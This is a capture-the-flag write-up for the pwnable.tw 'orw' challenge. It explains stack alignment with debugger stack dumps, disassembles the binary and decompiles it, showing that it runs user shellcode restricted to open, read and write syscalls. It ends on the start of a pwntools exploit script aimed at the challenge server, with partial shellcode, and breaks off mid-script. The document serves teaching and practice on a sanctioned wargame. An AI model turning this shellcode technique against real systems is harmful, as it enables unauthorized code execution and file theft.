---
name: Pwnable.tw Orw
tools: [Pwnable, Wargame, Beginner-friendly]
image: https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/pwnable/pwnable.png
description:  A 100-point challenge from pwnable
---

Follow the normal workflow and you have the following disassembly code from pwndbg.

```nasm
   0x08048548 <+0>:     lea    ecx,[esp+0x4]                // Stack_Alignment
   0x0804854c <+4>:     and    esp,0xfffffff0               //
   0x0804854f <+7>:     push   DWORD PTR [ecx-0x4]          //
   0x08048552 <+10>:    push   ebp                          // Function Prologue
   0x08048553 <+11>:    mov    ebp,esp                      // 
   0x08048555 <+13>:    push   ecx
=> 0x08048556 <+14>:    sub    esp,0x4
   0x08048559 <+17>:    call   0x80484cb <orw_seccomp>
   0x0804855e <+22>:    sub    esp,0xc
   0x08048561 <+25>:    push   0x80486a0
   0x08048566 <+30>:    call   0x8048380 <printf@plt>
   0x0804856b <+35>:    add    esp,0x10
   0x0804856e <+38>:    sub    esp,0x4
   0x08048571 <+41>:    push   0xc8
   0x08048576 <+46>:    push   0x804a060
   0x0804857b <+51>:    push   0x0
   0x0804857d <+53>:    call   0x8048370 <read@plt>
   0x08048582 <+58>:    add    esp,0x10
   0x08048585 <+61>:    mov    eax,0x804a060
   0x0804858a <+66>:    call   eax
   0x0804858c <+68>:    mov    eax,0x0
   0x08048591 <+73>:    mov    ecx,DWORD PTR [ebp-0x4]
   0x08048594 <+76>:    leave  
   0x08048595 <+77>:    lea    esp,[ecx-0x4]
   0x08048598 <+80>:    ret    
```

Let's try to understand the code first before exploiting.

## <u>1. Stack alignment explained</u>
If you know about this already, [skip to the initial analysis.](#initial-analysis)
The first 3 instructions is for aligning the stacks. I have read about this concept for a lifetime and everytime I encounter it I still find it confusing. Why aligning stack? To dumb it down: stack alignment helps read data in as few memory access cycles as possible, and that misalignment of stack pointers can lead to serious performance degradation.

Requirement:

- The starting address created by a memory allocation function (alloca, malloc, calloc or realloc) must be a multiple of 16.
-  The boundaries of stack frames for most functions must be 16 direct multiples.
Not only are the parameters and local variables passed to satisfy byte alignment, but our stack pointer (% rsp) must also be a multiple of 16.

Want to understand deeper? Go [here.](https://developpaper.com/byte-alignment-of-x86_64-linux-runtime-stack/)

#### <i>First instruction</i>
```nasm
0x08048548 <+0>:     lea    ecx,[esp+0x4]         // Load $esp+4 into ecx
```
```
STACK BEFORE THE INSTRUCTION:
00:0000│ esp 0xffffcd7c —▸ 0xf7dd1905 (__libc_start_main+229) ◂— add    esp, 0x10
01:0004│     0xffffcd80 ◂— 0x1

STACK AFTER THE INSTRUCTION:

00:0000│ esp 0xffffcd7c —▸ 0xf7dd1905 (__libc_start_main+229) ◂— add    esp, 0x10
01:0004│ ecx    0xffffcd80 ◂— 0x1
```
Notice that the value of $esp now is 0xffffcd7c. Which is not aligned to 16. 
A memory address is said to be aligned to 16 if it is evenly divisible by 16 (or the last hex is 0)

#### <i>Second instruction</i>
```nasm
0x804854c <main+4>     and    esp, 0xfffffff0   // and operation on $esp
```
```
STACK AFTER THIS INSTRUCTION:
00:0000│ esp 0xffffcd70 ◂— 0x1
01:0004│     0xffffcd74 —▸ 0x80483d0 (_start) ◂— xor    ebp, ebp
02:0008│     0xffffcd78 ◂— 0x0
03:000c│     0xffffcd7c —▸ 0xf7dd1905 (__libc_start_main+229) ◂— add    esp, 0x10
04:0010│ ecx 0xffffcd80 ◂— 0x1
```
The value of $esp now is 0xffffcd70. Just turn it into decimal and you will see it is divisible by 16.
Note that $ecx - 4 is the value of $esp at the beginning of main(), it will be relevant in the next instruction.

#### <i>Third instruction</i>
```nasm
0x0804854f <+7>:     push   DWORD PTR [ecx-0x4]  
```

```
STACK AFTER THIS INSTRUCTION:
00:0000│ esp 0xffffcd6c —▸ 0xf7dd1905 (__libc_start_main+229) ◂— add    esp, 0x10
01:0004│     0xffffcd70 ◂— 0x1
02:0008│     0xffffcd74 —▸ 0x80483d0 (_start) ◂— xor    ebp, ebp
03:000c│     0xffffcd78 ◂— 0x0
04:0010│     0xffffcd7c —▸ 0xf7dd1905 (__libc_start_main+229) ◂— add    esp, 0x10
05:0014│ ecx 0xffffcd80 ◂— 0x1  // This is the number of arguments, if I suppy two arguments this would be 0x3

This saves the original value of $esp at the beginning of main() to the stack.
```
OK, so the first two is pure stack alignment. This one is a little more nuance. These instructions are executed prior to the below [function prologue](https://www.learnvulnerabilityresearch.com/stack-frame-function-prologue#:~:text=When%20a%20function%20is%20called%2C%20it's%20return%20address%20is%20PUSHed,make%20room%20for%20local%20variables.). 

```nasm
0x8048552 <main+10>    push   ebp
0x8048553 <main+11>    mov    ebp, esp
```

And what is always before the function prologue? Yep, it's the return address and that return address is $ecx-4 or __libc_start_main(). The EBP is created by the instruction at 0x8048552 and the ret is there by pushing [ecx-4], denoted below:

```
$ESP                                                                              │
                     ┌────────────────────────────────────────────────────┐       │
   │                 │                                                    │       │
   └────────────────►│                   Caller's $ebx                    │       │        LOW ADDR
                     ├────────────────────────────────────────────────────┤       │
                     │                                                    │       │
                     │                   Caller's $esi                    │       │
                     ├────────────────────────────────────────────────────┤       │
                     │                                                    │       │
                     │                   Caller's $edi                    │       │
                     ├────────────────────────────────────────────────────┤       │
                     │                                                    │       │
                     │                  Local Variable 3                  │       │
                     │                                                    │       │
                     ├────────────────────────────────────────────────────┤       │
                     │                                                    │       │
                     │                  Local Variable 2                  │       │
                     │                                                    │       │
                     ├────────────────────────────────────────────────────┤       │
                     │                                                    │       │
                     │                  Local Variable 1                  │       │
                     │                                                    │       │
                     ├────────────────────────────────────────────────────┤       │
                     │                                                    │       │
                     │                        $EBP                        │       │
                     │                                                    │       │
                     ├────────────────────────────────────────────────────┤       │
                     │                                                    │       │
                     │                     Return Address                 │       │
                     │                                                    │       │
                     ├────────────────────────────────────────────────────┤       │
                     │                                                    │       │
                     │                   Parameter 1                      │       │
                     │                                                    │       │
                     ├────────────────────────────────────────────────────┤       │
                     │                                                    │       │
                     │                   Parameter 2                      │       │
                     ├────────────────────────────────────────────────────┤       │
                     │                                                    │       │       HIGH ADDR
                     │                  Parameter 3                       │       │
                     └────────────────────────────────────────────────────┘       ▼

```


## 2. <u id="initial-analysis">Initial Analysis</u>
First we get the type of the file.
```sh
$ file orw                                           
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
```
So it's a 32-bit Little-endian ELF. So pop the binary into your Linux machine to analyze. Remember to chmod the binary:
```sh
$ chmod +x ./orw
```

Disassemble it:
```sh
pwndbg> disass
Dump of assembler code for function main:
   0x08048548 <+0>:     lea    ecx,[esp+0x4]
   0x0804854c <+4>:     and    esp,0xfffffff0
   0x0804854f <+7>:     push   DWORD PTR [ecx-0x4]
   0x08048552 <+10>:    push   ebp
   0x08048553 <+11>:    mov    ebp,esp
   0x08048555 <+13>:    push   ecx
   0x08048556 <+14>:    sub    esp,0x4
   0x08048559 <+17>:    call   0x80484cb <orw_seccomp>     // This makes the binary only accept open, read and write syscall
   0x0804855e <+22>:    sub    esp,0xc
   0x08048561 <+25>:    push   0x80486a0                    // an array pointer pointing to  'Give my your shellcode:' string
   0x08048566 <+30>:    call   0x8048380 <printf@plt>       // int printf(const char *format, ...) takes argument format (a pointer)
   0x0804856b <+35>:    add    esp,0x10                     // clean up stacks
   0x0804856e <+38>:    sub    esp,0x4             
   0x08048571 <+41>:    push   0xc8                         // number of lengths
   0x08048576 <+46>:    push   0x804a060                    // shellcode buffer
   0x0804857b <+51>:    push   0x0                          // fd
   0x0804857d <+53>:    call   0x8048370 <read@plt>
   0x08048582 <+58>:    add    esp,0x10
   0x08048585 <+61>:    mov    eax,0x804a060
   0x0804858a <+66>:    call   eax                          // execute shellcode
   0x0804858c <+68>:    mov    eax,0x0
   0x08048591 <+73>:    mov    ecx,DWORD PTR [ebp-0x4]
   0x08048594 <+76>:    leave  
   0x08048595 <+77>:    lea    esp,[ecx-0x4]
   0x08048598 <+80>:    ret    
End of assembler dump.                                 

pwndbg> da 0x80486a0
80486a0 'Give my your shellcode:'      //dump string at address

```

Or you can just go the easy way and decompile it in IDA:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

Understand the code and you can move on to the next step.


## 3. <u id="exploitation">Exploitation</u>
So we can only use read, write and open in our syscall. So our job is to craft an one-off shellcode to read and write the flag to stdout for this challenge.
```python
from pwn import *
context(arch='i386', os = 'linux')
p = remote('chall.pwnable.tw',10001)
open = '''
mov eax, 0x5;
push 0x00006761
push 0x6c662f
'''
```